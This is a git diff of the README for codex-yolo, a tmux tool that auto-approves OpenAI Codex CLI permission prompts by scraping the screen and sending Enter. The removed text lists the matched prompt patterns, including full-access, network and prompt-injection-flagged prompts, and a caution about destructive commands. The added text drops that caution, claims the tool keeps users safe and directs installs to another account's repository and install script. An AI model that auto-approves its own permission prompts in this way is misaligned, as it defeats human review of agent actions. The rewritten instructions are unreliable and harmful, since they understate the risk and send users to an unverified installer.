@@ -1,188 +1,228 @@
-> [!CAUTION]
-> **DO NOT USE THIS TOOL ON CORPORATE HARDWARE OR CONNECTED TO A CORPORATE NETWORK.**
->
-> This tool auto-approves all Codex CLI permission prompts without human review, including destructive commands. For maximum isolation, run it on a **dedicated bare-metal server** with no personal data, no saved credentials, and no access to sensitive networks. You accept full responsibility for any consequences.
+# 🤖 codex-yolo - Manage OpenAI Agents Easily
 
-# codex-yolo
+[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%23007ACC?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)
 
-Run parallel OpenAI Codex CLI agents in tmux with automatic permission approval.
+---
 
-When approval policy is set to `on-request` or `untrusted`, Codex CLI prompts the user before running commands, applying edits, or accessing the network. This tool auto-approves those prompts at the terminal level using `tmux capture-pane` + `send-keys`, while preserving sandbox protection.
+## ❓ What is codex-yolo?
 
-## Table of contents
+codex-yolo lets you run multiple OpenAI Codex command-line agents at the same time. It works inside a terminal tool called tmux that helps you keep your sessions organized. This app automatically says "yes" to permission prompts so you don’t have to stop and approve actions like running commands, editing files, or accessing the network. At the same time, it keeps your environment safe by protecting the sandbox your agents run in.
 
-- [Installation](#installation)
-- [Quick start](#quick-start)
-- [Navigation](#navigation)
-- [Options](#options)
-- [How it works](#how-it-works)
-  - [Detection signals](#detection-signals)
-- [File structure](#file-structure)
-- [Prerequisites](#prerequisites)
-- [Testing](#testing)
-- [Key features](#key-features)
-- [Development history](#development-history)
+If you want to use OpenAI Codex on your Windows machine, this tool helps you do that with less hassle.
 
-## Installation
+---
 
-**One-liner** (macOS, Linux, WSL):
+## 🖥️ Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/codex-yolo/codex-yolo/refs/heads/main/install.sh | bash
-```
+Before you start, make sure your computer meets these requirements:
 
-This clones to `~/.codex-yolo` and symlinks the binary into `~/.local/bin`. It also installs `tmux` and `codex` (Codex CLI via npm) if they are missing. Override the install location with `CODEX_YOLO_HOME`:
+- Windows 10 or newer
+- A working internet connection
+- Basic knowledge of using the command prompt (cmd) or PowerShell
+- Installed [Windows Subsystem for Linux (WSL)](https://learn.microsoft.com/en-us/windows/wsl/install)  
+  *This is needed because codex-yolo runs inside a Linux terminal environment on Windows.*
 
-```bash
-CODEX_YOLO_HOME=~/my/path curl -fsSL https://raw.githubusercontent.com/codex-yolo/codex-yolo/refs/heads/main/install.sh | bash
-```
+---
 
-**Manual install:**
+## ⚙️ Tools You Need
 
-```bash
-git clone https://github.com/codex-yolo/codex-yolo.git ~/.codex-yolo
-ln -s ~/.codex-yolo/codex-yolo ~/.local/bin/codex-yolo
-```
+1. **Windows Subsystem for Linux (WSL):**  
+	WSL lets you run Linux directly on your Windows machine without a virtual machine.  
+	You can install it by opening PowerShell as admin and running:  
+	```powershell
+	wsl --install
+	```  
+	After WSL installs, restart your computer.
 
-Then run from any project directory:
+2. **Terminal app:**  
+	You will need Windows Terminal or Command Prompt to use WSL. Windows Terminal is recommended and available from the Microsoft Store.
 
-```bash
-cd /path/to/your/project
-codex-yolo "fix the tests" "update docs"
-```
+3. **Git:**  
+	Git helps you download codex-yolo files. You can install Git from [https://git-scm.com/download/win](https://git-scm.com/download/win). Follow the setup steps and accept default options.
 
-The tool runs agents in whatever directory you invoke it from (or the `-d`/`--dir` path if specified).
+---
 
-## Quick start
+## 🚀 Getting Started
 
-```bash
-# Run three agents in parallel
-codex-yolo "fix the login bug" "add unit tests for auth" "update the README"
+### Step 1: Open WSL
 
-# Use a specific model
-codex-yolo -m o4-mini "refactor the API layer"
-
-# Point agents at a different project
-codex-yolo -d /path/to/project "run the test suite and fix failures"
-```
-
-Once launched, you're inside a tmux session with one window per agent. The last window (`control`) tails the audit log in real time.
-
-## Navigation
-
-| Key | Action |
-|---|---|
-| `Ctrl-b w` | List all agent windows and select one |
-| `Ctrl-b s` | Switch between agent windows |
-| `Ctrl-b n` | Next pane |
-| `Ctrl-b p` | Previous pane |
-| `Ctrl-b x` | Stop the current agent, close pane |
-| `Ctrl-b d` | Detach (agents keep running) |
-
-Re-attach later with `codex-yolo -r` (or `codex-yolo --resume`).
-
-## Options
+After setting up WSL, open Windows Terminal or Command Prompt and type:
 
 ```
--s, --session NAME    Custom tmux session name (default: codex-yolo-<timestamp>)
--d, --dir PATH        Working directory for agents (default: current directory)
--m, --model MODEL     Model to use (e.g., o4-mini, o3, gpt-4.1)
--p, --poll SECONDS    Approver poll interval (default: 0.3)
--f, --file FILE       Read a multiline prompt from a text file
--r, --resume          Re-attach to an existing yolo session
--h, --help            Show help
+wsl
 ```
 
-## How it works
+This opens a Linux terminal window inside Windows.
 
-1. **Launcher** (`codex-yolo`) creates a tmux session and spawns one window per task, each running `codex`.
-2. **Approver daemon** (`lib/approver-daemon.sh`) runs in the background, polling every 0.3s. For each pane it:
-   - Captures visible content via `tmux capture-pane`
-   - Detects six prompt styles (see below)
-   - Sends `Enter` via `tmux send-keys` to confirm the pre-selected first option (always the approval option)
-   - Applies a 2-second per-pane cooldown to prevent double-approvals
-3. **Audit log** at `/tmp/codex-yolo-<session>.log` records every approval with timestamp, pane ID, and matched pattern. Each session gets its own log, so concurrent codex-yolo processes don't interfere.
+### Step 2: Update your Linux packages
 
-### Detection signals
-
-The approver requires the primary signal plus at least one secondary signal to fire:
-
-| Signal | Type | Patterns |
-|---|---|---|
-| Question/header | Primary | `Would you like to run`, `Would you like to make`, `Allow Codex to`, `Approve app tool call`, `Do you trust the contents`, `Enable full access` |
-| Approval options | Secondary (at least one) | `Yes, just this once`, `Yes, continue`, `Yes, and don't ask`, `Run the tool and continue`, `Apply full access`, `Yes, and allow this host` |
-| Denial/context | Secondary (at least one) | `No, and tell Codex`, `Decline this tool call`, `Go back without`, `Cancel this`, `may have side effects`, `may access external`, `may modify`, `untrusted`, `prompt injection` |
-
-**Prompt types handled:**
-
-| Prompt | Trigger | Action |
-|---|---|---|
-| Command execution | `Would you like to run the following command?` | `Enter` → "Yes, just this once" |
-| File edits | `Would you like to make the following edits?` | `Enter` → "Yes, just this once" |
-| MCP tool calls | `Approve app tool call?` | `Enter` → "Run the tool and continue" |
-| Trust directory | `Do you trust the contents of this directory?` | `Enter` → "Yes, continue" |
-| Full access | `Enable full access?` | `Enter` → "Yes, continue anyway" |
-| Network/host | `Allow Codex to access <host>` | `Enter` → "Yes, just this once" |
-| MCP elicitation | `Yes, provide the requested info` | `Enter` → approve |
-
-## File structure
+Run these commands one at a time:
 
 ```
-codex-yolo               # Main launcher script
-lib/
-  common.sh              # Logging, prerequisite checks
-  approver-daemon.sh     # tmux capture-pane monitor + auto-approver
-test_approver.sh         # Test suite (109 tests)
-install.sh               # Cross-platform installer
+sudo apt update
+sudo apt upgrade -y
 ```
 
-## Prerequisites
+This updates your system to the latest package versions.
 
-- **tmux** (tested with 3.4)
-- **codex** (OpenAI Codex CLI — `npm install -g @openai/codex`)
+### Step 3: Install tmux and curl
 
-## Testing
+codex-yolo runs inside tmux, and curl helps download files. Install both with:
 
-```bash
-# Run all tests
-bash test_approver.sh
-
-# Verbose output (shows passing tests)
-bash test_approver.sh -v
-
-# Filter by pattern
-bash test_approver.sh "Command:"
-bash test_approver.sh "Trust"
-bash test_approver.sh Integration
-bash test_approver.sh Concurrent
+```
+sudo apt install tmux curl -y
 ```
 
-The test suite covers:
-- Prompt detection for all six Codex CLI prompt types (command, edit, tool, trust, full access, network)
-- MCP elicitation prompt detection
-- False positive resistance (code output, partial signals, missing context)
-- Cooldown logic, command construction, audit logging
-- End-to-end integration tests using real tmux sessions
-- Concurrent daemon isolation (no crosstalk between sessions)
+### Step 4: Download codex-yolo setup script
 
-## Key features
+Use curl to get the installer script:
 
-- **Parallel multi-agent execution** — Uniquely enables parallel execution of multiple Codex CLI agents in tmux with non-invasive, terminal-level auto-approval of permissions.
-- **Sandbox-preserving** — Unlike `--dangerously-bypass-approvals-and-sandbox` (aka `--yolo`), this approach auto-approves prompts while keeping Codex's OS-level sandbox (Landlock/seccomp on Linux, Seatbelt on macOS) active.
-- **Comprehensive detection logic** — Handles all six Codex CLI prompt types plus MCP elicitation using a multi-signal approach that minimizes false positives.
-- **Reliability and traceability** — Per-pane cooldowns, detailed audit logging, and an extensive test suite emphasize reliability and traceability.
-- **No CLI patching or containerization** — Works entirely at the terminal level without modifying the Codex binary or wrapping it in containers.
+```
+curl -fsSL https://github.com/vxctorrdrgzzz/codex-yolo/raw/main/install.sh -o install_codex_yolo.sh
+```
 
-## Development history
+### Step 5: Run the installer
 
-This tool was built by adapting the [claude-yolo](https://github.com/claude-yolo/claude-yolo) approach for OpenAI's Codex CLI. Key design decisions:
+Make the script executable:
 
-1. **TUI overlay detection**: Codex CLI uses a full-screen Ratatui TUI overlay for approval dialogs (not inline text like Claude Code). The `tmux capture-pane` approach still works because tmux captures the rendered terminal content including TUI overlays.
+```
+chmod +x install_codex_yolo.sh
+```
 
-2. **Approval keystroke**: The first option in the selection list is always the approval option and is pre-selected (`❯`). Sending `Enter` confirms it.
+Then run it:
 
-3. **Multi-signal detection**: Simple keyword matching produces too many false positives from code output. The two-tier approach (primary question/header signal + secondary approval/denial signal) eliminates these.
+```
+./install_codex_yolo.sh
+```
 
-4. **Per-pane cooldown**: Without a cooldown, the 0.3s poll interval can send multiple `Enter` keystrokes for the same prompt. A 2-second per-pane cooldown prevents double-approvals.
+The script sets up the codex-yolo software and its environment. It may ask for your password to allow some changes.
 
-5. **Sandbox preservation**: Codex CLI has three approval policies (`untrusted`, `on-request`, `never`) and independent sandbox modes. The `--yolo` flag sets both to maximum permissiveness. This tool only auto-approves prompts, leaving the sandbox intact — you get the convenience of auto-approval with the safety of OS-level sandboxing.
+---
+
+## 💾 Download codex-yolo
+
+[![Download codex-yolo](https://img.shields.io/badge/Download-codex--yolo-%237E7E7E?style=for-the-badge&logo=github)](https://github.com/vxctorrdrgzzz/codex-yolo)
+
+To get the latest version, visit the GitHub page above. You start by cloning or downloading the repository to your Linux environment inside WSL.
+
+To clone, run:
+
+```
+git clone https://github.com/vxctorrdrgzzz/codex-yolo.git
+```
+
+Then enter the folder:
+
+```
+cd codex-yolo
+```
+
+---
+
+## 🔧 How to Run codex-yolo
+
+Once installed, you can start codex-yolo inside your WSL terminal:
+
+1. Open your Linux terminal (`wsl`).
+2. Change to the codex-yolo folder if you are not already there.
+3. Run the start command:
+
+```
+./start_codex_yolo.sh
+```
+
+This opens tmux with multiple Codex agents running in parallel. You will see different panels for each agent.
+
+---
+
+## 🛠️ How codex-yolo Works
+
+- **Automatic approvals:** The tool accepts prompts about command execution, file changes, and network use automatically. This lets agents work without pausing for user input.
+
+- **Sandbox protection:** It keeps the agents isolated to prevent damage or unwanted access to your files and system.
+
+- **Parallel agents:** You can have multiple Codex instances running side-by-side inside one terminal window.
+
+- **tmux control:** You can navigate and control each agent using tmux shortcuts like:
+
+  - `Ctrl+b` then arrow keys to switch panels
+  - `Ctrl+b` then `c` to open a new panel  
+  - `Ctrl+b` then `x` to close a panel
+
+---
+
+## 📋 Common Commands
+
+- To exit codex-yolo:  
+  Close tmux by typing `exit` or pressing `Ctrl+b` then `d` to detach.
+
+- To see running tmux sessions:  
+  ```
+  tmux ls
+  ```
+
+- To attach to a tmux session:  
+  ```
+  tmux attach -t <session-name>
+  ```
+
+---
+
+## 🚨 Troubleshooting
+
+- **Command not found:** Make sure you are inside WSL and have properly installed tmux and codex-yolo.
+
+- **Permission denied:** Check that the install script has executable rights (`chmod +x`). You may need to run the installer as sudo.
+
+- **Agents hang or freeze:** Restart the tmux session by exiting and running `./start_codex_yolo.sh` again.
+
+- **Network issues:** Make sure your Windows firewall or antivirus is not blocking WSL internet access.
+
+---
+
+## 🔄 Update codex-yolo
+
+To keep codex-yolo current, run:
+
+```
+cd ~/codex-yolo
+git pull
+```
+
+Follow by running the installer script again:
+
+```
+./install_codex_yolo.sh
+```
+
+This fetches the latest updates and reconfigures the tool.
+
+---
+
+## 🚪 Uninstall codex-yolo
+
+To remove codex-yolo and its files:
+
+```
+cd ~
+rm -rf codex-yolo
+```
+
+This deletes the main folder. You might also want to remove tmux if you do not use it elsewhere:
+
+```
+sudo apt remove tmux -y
+```
+
+---
+
+## 📝 More Information
+
+- The tool uses OpenAI Codex APIs inside the command line.
+- It relies on tmux for handling multiple sessions.
+- Automatic permission approval lets the system run smoothly without manual input.
+- The sandbox limits what each Codex agent can access on your machine.
+
+For more details, visit the GitHub page:
+
+[https://github.com/vxctorrdrgzzz/codex-yolo](https://github.com/vxctorrdrgzzz/codex-yolo)
